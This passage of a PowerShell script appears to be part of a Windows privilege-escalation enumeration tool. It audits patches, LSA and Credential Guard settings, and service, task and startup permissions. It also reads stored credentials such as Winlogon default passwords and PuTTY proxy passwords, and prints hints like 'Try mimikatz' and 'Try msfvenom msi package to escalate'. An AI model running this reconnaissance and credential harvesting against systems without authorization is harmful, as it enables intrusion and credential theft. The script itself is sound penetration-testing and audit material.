Write-Host "=| Check missing patches with the embedded windows vulnerability definitions" -ForegroundColor Yellow
$Hotfix = Get-HotFix | Sort-Object -Descending -Property InstalledOn -ErrorAction SilentlyContinue | Select-Object HotfixID, Description, InstalledBy, InstalledOn
$Hotfix | Format-Table -AutoSize


# PrintNightmare PointAndPrint policy checks
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| PRINTNIGHTMARE POINTANDPRINT POLICY"
$pnKey = "HKLM:\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
if (Test-Path $pnKey) {
  $pn = Get-ItemProperty -Path $pnKey -ErrorAction SilentlyContinue
  $restrict = $pn.RestrictDriverInstallationToAdministrators
  $noWarn = $pn.NoWarningNoElevationOnInstall
  $updatePrompt = $pn.UpdatePromptSettings

  Write-Host "RestrictDriverInstallationToAdministrators: $restrict"
  Write-Host "NoWarningNoElevationOnInstall: $noWarn"
  Write-Host "UpdatePromptSettings: $updatePrompt"

  $hasAllValues = ($null -ne $restrict) -and ($null -ne $noWarn) -and ($null -ne $updatePrompt)
  if (-not $hasAllValues) {
    Write-Host "PointAndPrint policy values are missing or not configured" -ForegroundColor Gray
  } elseif (($restrict -eq 0) -and ($noWarn -eq 1) -and ($updatePrompt -eq 2)) {
    Write-Host "Potentially vulnerable to PrintNightmare misconfiguration" -ForegroundColor Red
  } else {
    Write-Host "PointAndPrint policy is not in the known risky configuration" -ForegroundColor Green
  }
} else {
  Write-Host "PointAndPrint policy key not found" -ForegroundColor Gray
}


#Show all unique updates installed
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| ALL UPDATES INSTALLED"


# 0, and 5 are not used for history
# See https://msdn.microsoft.com/en-us/library/windows/desktop/aa387095(v=vs.85).aspx
# Source: https://stackoverflow.com/questions/41626129/how-do-i-get-the-update-history-from-windows-update-in-powershell?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa

$session = (New-Object -ComObject 'Microsoft.Update.Session')
# Query the latest 50 updates starting with the first record
$history = $session.QueryHistory("", 0, 1000) | Select-Object ResultCode, Date, Title

#create an array for unique HotFixes
$HotfixUnique = @()
#$HotfixUnique += ($history[0].title | Select-String -AllMatches -Pattern 'KB(\d{4,6})').Matches.Value

$HotFixReturnNum = @()
#$HotFixReturnNum += 0 

for ($i = 0; $i -lt $history.Count; $i++) {
  $check = returnHotFixID -title $history[$i].Title
  if ($HotfixUnique -like $check) {
    #Do Nothing
  }
  else {
    $HotfixUnique += $check
    $HotFixReturnNum += $i
  }
}
$FinalHotfixList = @()

$hotfixreturnNum | ForEach-Object {
  $HotFixItem = $history[$_]
  $Result = $HotFixItem.ResultCode
  # https://learn.microsoft.com/en-us/windows/win32/api/wuapi/ne-wuapi-operationresultcode?redirectedfrom=MSDN
  switch ($Result) {
    1 {
      $Result = "Missing/Superseded"
    }
    2 {
      $Result = "Succeeded"
    }
    3 {
      $Result = "Succeeded With Errors"
    }
    4 {
      $Result = "Failed"
    }
    5 {
      $Result = "Canceled"
    }
  }
  $FinalHotfixList += New-Object -TypeName PSObject -Property ([Ordered]@{ 
    Result = $Result
    Date   = $HotFixItem.Date
    Title  = $HotFixItem.Title
  })
}
$FinalHotfixList | Format-Table -AutoSize


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Drive Info"
# Load the System.Management assembly
Add-Type -AssemblyName System.Management

# Create a ManagementObjectSearcher to query Win32_LogicalDisk
$diskSearcher = New-Object System.Management.ManagementObjectSearcher("SELECT * FROM Win32_LogicalDisk WHERE DriveType = 3")

# Get the system drives
$systemDrives = $diskSearcher.Get()

# Loop through each drive and display its information
foreach ($drive in $systemDrives) {
  $driveLetter = $drive.DeviceID
  $driveLabel = $drive.VolumeName
  $driveSize = [math]::Round($drive.Size / 1GB, 2)
  $driveFreeSpace = [math]::Round($drive.FreeSpace / 1GB, 2)

  Write-Output "Drive: $driveLetter"
  Write-Output "Label: $driveLabel"
  Write-Output "Size: $driveSize GB"
  Write-Output "Free Space: $driveFreeSpace GB"
  Write-Output ""
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Antivirus Detection (attemping to read exclusions as well)"
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName
Get-ChildItem 'registry::HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions' -ErrorAction SilentlyContinue


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| NET ACCOUNTS Info"
net accounts

######################## REGISTRY SETTING CHECK ########################
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| REGISTRY SETTINGS CHECK"

 
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Audit Log Settings"
#Check audit registry
if ((Test-Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit\).Property) {
  Get-Item -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit\
}
else {
  Write-Host "No Audit Log settings, no registry entry found."
}

 
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Windows Event Forward (WEF) registry"
if (Test-Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager) {
  Get-Item HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
}
else {
  Write-Host "Logs are not being fowarded, no registry entry found."
}

 
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| LAPS Check"
if (Test-Path 'C:\Program Files\LAPS\CSE\Admpwd.dll') { Write-Host "LAPS dll found on this machine at C:\Program Files\LAPS\CSE\" -ForegroundColor Green }
elseif (Test-Path 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll' ) { Write-Host "LAPS dll found on this machine at C:\Program Files (x86)\LAPS\CSE\" -ForegroundColor Green }
else { Write-Host "LAPS dlls not found on this machine" }
if ((Get-ItemProperty HKLM:\Software\Policies\Microsoft Services\AdmPwd -ErrorAction SilentlyContinue).AdmPwdEnabled -eq 1) { Write-Host "LAPS registry key found on this machine" -ForegroundColor Green }


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| WDigest Check"
$WDigest = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest).UseLogonCredential
switch ($WDigest) {
  0 { Write-Host "Value 0 found. Plain-text Passwords are not stored in LSASS" }
  1 { Write-Host "Value 1 found. Plain-text Passwords may be stored in LSASS" -ForegroundColor red }
  Default { Write-Host "The system was unable to find the specified registry value: UseLogonCredential" }
}

 
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| LSA Protection Check"
$RunAsPPL = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\LSA).RunAsPPL
$RunAsPPLBoot = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\LSA).RunAsPPLBoot
switch ($RunAsPPL) {
  2 { Write-Host "RunAsPPL: 2. Enabled without UEFI Lock" }
  1 { Write-Host "RunAsPPL: 1. Enabled with UEFI Lock" }
  0 { Write-Host "RunAsPPL: 0. LSA Protection Disabled. Try mimikatz." -ForegroundColor red }
  Default { "The system was unable to find the specified registry value: RunAsPPL / RunAsPPLBoot" }
}
if ($RunAsPPLBoot) { Write-Host "RunAsPPLBoot: $RunAsPPLBoot" }

 
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Credential Guard Check"
$LsaCfgFlags = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\LSA).LsaCfgFlags
switch ($LsaCfgFlags) {
  2 { Write-Host "LsaCfgFlags 2. Enabled without UEFI Lock" }
  1 { Write-Host "LsaCfgFlags 1. Enabled with UEFI Lock" }
  0 { Write-Host "LsaCfgFlags 0. LsaCfgFlags Disabled." -ForegroundColor red }
  Default { "The system was unable to find the specified registry value: LsaCfgFlags" }
}

 
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Cached WinLogon Credentials Check"
if (Test-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon") {
  (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "CACHEDLOGONSCOUNT").CACHEDLOGONSCOUNT
  Write-Host "However, only the SYSTEM user can view the credentials here: HKEY_LOCAL_MACHINE\SECURITY\Cache"
  Write-Host "Or, using mimikatz lsadump::cache"
}

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Additonal Winlogon Credentials Check"

(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").DefaultDomainName
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").DefaultUserName
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").DefaultPassword
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").AltDefaultDomainName
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").AltDefaultUserName
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").AltDefaultPassword


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| RDCMan Settings Check"

if (Test-Path "$env:USERPROFILE\appdata\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings") {
  Write-Host "RDCMan Settings Found at: $($env:USERPROFILE)\appdata\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings" -ForegroundColor Red
}
else { Write-Host "No RDCMan.Settings found." }


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| RDP Saved Connections Check"

Write-Host "HK_Users"
New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS -ErrorAction SilentlyContinue
Get-ChildItem HKU:\ -ErrorAction SilentlyContinue | ForEach-Object {
  # get the SID from output
  $HKUSID = $_.Name.Replace('HKEY_USERS\', "")
  if (Test-Path "registry::HKEY_USERS\$HKUSID\Software\Microsoft\Terminal Server Client\Default") {
    Write-Host "Server Found: $((Get-ItemProperty "registry::HKEY_USERS\$HKUSID\Software\Microsoft\Terminal Server Client\Default" -Name MRU0).MRU0)"
  }
  else { Write-Host "Not found for $($_.Name)" }
}

Write-Host "HKCU"
if (Test-Path "registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default") {
  Write-Host "Server Found: $((Get-ItemProperty "registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" -Name MRU0).MRU0)"
}
else { Write-Host "Terminal Server Client not found in HCKU" }

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Putty Stored Credentials Check"

if (Test-Path HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions) {
  Get-ChildItem HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions | ForEach-Object {
    $RegKeyName = Split-Path $_.Name -Leaf
    Write-Host "Key: $RegKeyName"
    @("HostName", "PortNumber", "UserName", "PublicKeyFile", "PortForwardings", "ConnectionSharing", "ProxyUsername", "ProxyPassword") | ForEach-Object {
      Write-Host "$_ :"
      Write-Host "$((Get-ItemProperty  HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions\$RegKeyName).$_)"
    }
  }
}
else { Write-Host "No putty credentials found in HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions" }


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| SSH Key Checks"
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| If found:"
Write-Host "https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/" -ForegroundColor Yellow
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Checking Putty SSH KNOWN HOSTS"
if (Test-Path HKCU:\Software\SimonTatham\PuTTY\SshHostKeys) { 
  Write-Host "$((Get-Item -Path HKCU:\Software\SimonTatham\PuTTY\SshHostKeys).Property)"
}
else { Write-Host "No putty ssh keys found" }


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Checking for OpenSSH Keys"
if (Test-Path HKCU:\Software\OpenSSH\Agent\Keys) { Write-Host "OpenSSH keys found. Try this for decryption: https://github.com/ropnop/windows_sshagent_extract" -ForegroundColor Yellow }
else { Write-Host "No OpenSSH Keys found." }


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Checking for WinVNC Passwords"
if (Test-Path "HKCU:\Software\ORL\WinVNC3\Password") { Write-Host " WinVNC found at HKCU:\Software\ORL\WinVNC3\Password" }else { Write-Host "No WinVNC found." }


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Checking for SNMP Passwords"
if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP") { Write-Host "SNMP Key found at HKLM:\SYSTEM\CurrentControlSet\Services\SNMP" }else { Write-Host "No SNMP found." }


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Checking for TightVNC Passwords"
if (Test-Path "HKCU:\Software\TightVNC\Server") { Write-Host "TightVNC key found at HKCU:\Software\TightVNC\Server" }else { Write-Host "No TightVNC found." }


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| UAC Settings"
if ((Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA -eq 1) {
  Write-Host "EnableLUA is equal to 1. Part or all of the UAC components are on."
  Write-Host "https://book.hacktricks.wiki/en/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html#very-basic-uac-bypass-full-file-system-access" -ForegroundColor Yellow
}
else { Write-Host "EnableLUA value not equal to 1" }


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Recently Run Commands (WIN+R)"

Get-ChildItem HKU:\ -ErrorAction SilentlyContinue | ForEach-Object {
  # get the SID from output
  $HKUSID = $_.Name.Replace('HKEY_USERS\', "")
  $property = (Get-Item "HKU:\$_\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction SilentlyContinue).Property
  $HKUSID | ForEach-Object {
    if (Test-Path "HKU:\$_\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU") {
      Write-Host -ForegroundColor Blue "=========||HKU Recently Run Commands"
      foreach ($p in $property) {
        Write-Host "$((Get-Item "HKU:\$_\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction SilentlyContinue).getValue($p))" 
      }
    }
  }
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========||HKCU Recently Run Commands"
$property = (Get-Item "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction SilentlyContinue).Property
foreach ($p in $property) {
  Write-Host "$((Get-Item "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction SilentlyContinue).getValue($p))"
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Always Install Elevated Check"
 
 
Write-Host "Checking Windows Installer Registry (will populate if the key exists)"
if ((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated -eq 1) {
  Write-Host "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer).AlwaysInstallElevated = 1" -ForegroundColor red
  Write-Host "Try msfvenom msi package to escalate" -ForegroundColor red
  Write-Host "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#metasploit-payloads" -ForegroundColor Yellow
}
 
if ((Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated -eq 1) { 
  Write-Host "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer).AlwaysInstallElevated = 1" -ForegroundColor red
  Write-Host "Try msfvenom msi package to escalate" -ForegroundColor red
  Write-Host "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#metasploit-payloads" -ForegroundColor Yellow
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| PowerShell Info"

(Get-ItemProperty registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine).PowerShellVersion | ForEach-Object {
  Write-Host "PowerShell $_ available"
}
(Get-ItemProperty registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine).PowerShellVersion | ForEach-Object {
  Write-Host  "PowerShell $_ available"
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| PowerShell Registry Transcript Check"

if (Test-Path HKCU:\Software\Policies\Microsoft\Windows\PowerShell\Transcription) {
  Get-Item HKCU:\Software\Policies\Microsoft\Windows\PowerShell\Transcription
}
if (Test-Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription) {
  Get-Item HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription
}
if (Test-Path HKCU:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription) {
  Get-Item HKCU:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
}
if (Test-Path HKLM:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription) {
  Get-Item HKLM:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
}
 

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| PowerShell Module Log Check"
if (Test-Path HKCU:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging) {
  Get-Item HKCU:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
}
if (Test-Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging) {
  Get-Item HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
}
if (Test-Path HKCU:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging) {
  Get-Item HKCU:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
}
if (Test-Path HKLM:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging) {
  Get-Item HKLM:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
}
 

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| PowerShell Script Block Log Check"
 
if ( Test-Path HKCU:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging) {
  Get-Item HKCU:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
}
if ( Test-Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging) {
  Get-Item HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
}
if ( Test-Path HKCU:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging) {
  Get-Item HKCU:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
}
if ( Test-Path HKLM:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging) {
  Get-Item HKLM:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| WSUS check for http and UseWAServer = 1, if true, might be vulnerable to exploit"
Write-Host "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus" -ForegroundColor Yellow
if (Test-Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate) {
  Get-Item HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate
}
if ((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU -Name "USEWUServer" -ErrorAction SilentlyContinue).UseWUServer) {
  (Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU -Name "USEWUServer").UseWUServer
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Internet Settings HKCU / HKLM"

$property = (Get-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -ErrorAction SilentlyContinue).Property
foreach ($p in $property) {
  Write-Host "$p - $((Get-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -ErrorAction SilentlyContinue).getValue($p))"
}
 
$property = (Get-Item "HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -ErrorAction SilentlyContinue).Property
foreach ($p in $property) {
  Write-Host "$p - $((Get-Item "HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -ErrorAction SilentlyContinue).getValue($p))"
}


######################## PROCESS INFORMATION ########################
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| RUNNING PROCESSES"


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Checking user permissions on running processes"
Get-Process | Select-Object Path -Unique | ForEach-Object { Start-ACLCheck -Target $_.path }


#TODO, vulnerable system process running that we have access to. 
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| System processes"
Start-Process tasklist -ArgumentList '/v /fi "username eq system"' -Wait -NoNewWindow


######################## SERVICES ########################
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| SERVICE path vulnerable check"
Write-Host "Checking for vulnerable service .exe"
# Gathers all services running and stopped, based on .exe and shows the AccessControlList
$UniqueServices = @{}
$sqlServiceShown = 0
$sqlContextTimedOut = $false
$sqlIdentity = try { [Security.Principal.WindowsIdentity]::GetCurrent().Name } catch { $null }
$serviceInventory = try { @(Get-WmiObject Win32_Service -ErrorAction Stop) } catch {
  Write-Host "[?] Local service inventory unavailable; SQL service run-as context unknown." -ForegroundColor Yellow
  @()
}
$sqlContextTimer = [Diagnostics.Stopwatch]::StartNew()
$serviceInventory | ForEach-Object {
  if ($_.Name -match '^(MSSQLSERVER|SQLSERVERAGENT|MSSQL\$.*|SQLAgent\$.*)$') {
    if ($sqlServiceShown -lt 10) {
      $runAs = if ($_.StartName) { $_.StartName } else { 'unknown' }
      Write-Host "[i] SQL service $($_.Name): state=$($_.State); run-as=$runAs. Match to an MSSQLSvc SPN only after verifying the account; ticket acceptance and SQL roles are unknown."
      if ($sqlContextTimer.ElapsedMilliseconds -lt 2000) {
        try {
          $sqlReg = Get-ItemProperty -LiteralPath ("HKLM:\SYSTEM\CurrentControlSet\Services\" + $_.Name) -ErrorAction Stop
          $required = @($sqlReg.RequiredPrivileges | Where-Object { $null -ne $_ -and $_ -ne '' })
          if ($null -eq $sqlReg.RequiredPrivileges) {
            Write-Host "[?]   Registry RequiredPrivileges unavailable or not configured."
          } else {
            $shown = @($required | Select-Object -First 16 | ForEach-Object {
              $value = ([string]$_ -replace '[\x00-\x1f\x7f]', ' ')
              if ($value.Length -gt 64) { $value.Substring(0, 64) + '...' } else { $value }
            })
            $suffix = if ($required.Count -gt 16) { ', ...' } else { '' }
            Write-Host "[i]   Registry RequiredPrivileges: $($shown -join ', ')$suffix"
          }
          $sameAccount = $false
          if ($sqlIdentity -and $sqlReg.ObjectName) {
            $configuredAccount = [string]$sqlReg.ObjectName
            if ($configuredAccount.StartsWith('.\')) { $configuredAccount = $env:COMPUTERNAME + $configuredAccount.Substring(1) }
            $sameAccount = $configuredAccount -ieq $sqlIdentity
          }
          if ($sameAccount) {
            Write-Host "[i]   Service account matches this process identity; compare configured rights with this process token privileges. Original service token and exploitability remain unknown."
          } else {
            Write-Host "[i]   Service account does not match this process identity or identity is unavailable; no token comparison."
          }
        } catch {
          Write-Host "[?]   Registry RequiredPrivileges unavailable; no token comparison." -ForegroundColor Yellow
        }
      } else { $sqlContextTimedOut = $true }
    }
    $sqlServiceShown++
  }
  if ($_.PathName -like '*.exe*') {
    $Path = ($_.PathName -split '(?<=\.exe\b)')[0].Trim('"')
    $UniqueServices[$Path] = $_.Name
  }
}
if ($sqlServiceShown -gt 10) { Write-Host "[i] $($sqlServiceShown - 10) additional SQL services omitted." }
if ($sqlContextTimedOut) { Write-Host "[?] SQL service privilege configuration inspection stopped at its 2-second limit." -ForegroundColor Yellow }
if ($sqlServiceShown -gt 0) { Write-Host "[i] RequiredPrivileges is service configuration, not a captured service token; another token for the same account may differ." }
foreach ( $h in ($UniqueServices | Select-Object -Unique).GetEnumerator()) {
  Start-ACLCheck -Target $h.Name -ServiceName $h.Value
}


######################## UNQUOTED SERVICE PATH CHECK ############
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Checking for Unquoted Service Paths"
# All credit to Ivan-Sincek
# https://github.com/ivan-sincek/unquoted-service-paths/blob/master/src/unquoted_service_paths_mini.ps1

UnquotedServicePathCheck


######################## REGISTRY SERVICE CONFIGURATION CHECK ###
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Checking Service Registry Permissions"
Write-Host "This will take some time."

Get-ChildItem 'HKLM:\System\CurrentControlSet\services\' | ForEach-Object {
  $target = $_.Name.Replace("HKEY_LOCAL_MACHINE", "hklm:")
  Start-aclcheck -Target $target
}


######################## SCHEDULED TASKS ########################
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| SCHEDULED TASKS vulnerable check"
#Scheduled tasks audit 


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Testing access to c:\windows\system32\tasks"
if (Get-ChildItem "c:\windows\system32\tasks" -ErrorAction SilentlyContinue) {
  Write-Host "Access confirmed, may need futher investigation"
  Get-ChildItem "c:\windows\system32\tasks"
}
else {
  Write-Host "No admin access to scheduled tasks folder."
  Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | ForEach-Object {
    $Actions = $_.Actions.Execute
    if ($Actions -ne $null) {
      foreach ($a in $actions) {
        if ($a -like "%windir%*") { $a = $a.replace("%windir%", $Env:windir) }
        elseif ($a -like "%SystemRoot%*") { $a = $a.replace("%SystemRoot%", $Env:windir) }
        elseif ($a -like "%localappdata%*") { $a = $a.replace("%localappdata%", "$env:UserProfile\appdata\local") }
        elseif ($a -like "%appdata%*") { $a = $a.replace("%localappdata%", $env:Appdata) }
        $a = $a.Replace('"', '')
        Start-ACLCheck -Target $a
        Write-Host "`n"
        Write-Host "TaskName: $($_.TaskName)"
        Write-Host "-------------"
        New-Object -TypeName PSObject -Property ([Ordered]@{
          LastResult = $(($_ | Get-ScheduledTaskInfo).LastTaskResult)
          NextRun    = $(($_ | Get-ScheduledTaskInfo).NextRunTime)
          Status     = $_.State
          Command    = $_.Actions.execute
          Arguments  = $_.Actions.Arguments 
        }) | Write-Host
      } 
    }
  }
}


######################## STARTUP APPLIICATIONS #########################
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| STARTUP APPLICATIONS Vulnerable Check"
"Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary"
Write-Host "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#run-at-startup" -ForegroundColor Yellow

@("C:\Documents and Settings\All Users\Start Menu\Programs\Startup",
  "C:\Documents and Settings\$env:Username\Start Menu\Programs\Startup", 
  "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup", 
  "$env:Appdata\Microsoft\Windows\Start Menu\Programs\Startup") | ForEach-Object {
  if (Test-Path $_) {
    # CheckACL of each top folder then each sub folder/file
    Start-ACLCheck $_
    Get-ChildItem -Recurse -Force -Path $_ | ForEach-Object {
      $SubItem = $_.FullName
      if (Test-Path $SubItem) { 
        Start-ACLCheck -Target $SubItem
      }
    }
  }
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| STARTUP APPS Registry Check"

@("registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
  "registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
  "registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
  "registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce") | ForEach-Object {
  # CheckACL of each Property Value found
  $ROPath = $_
  (Get-Item $_) | ForEach-Object {
    $ROProperty = $_.property
    $ROProperty | ForEach-Object {
      Start-ACLCheck ((Get-ItemProperty -Path $ROPath).$_ -split '(?<=\.exe\b)')[0].Trim('"')
    }
  }
}

#schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab informa"


######################## INSTALLED APPLICATIONS ########################
Write-Host ""
if ($TimeStamp) { TimeElapsed }
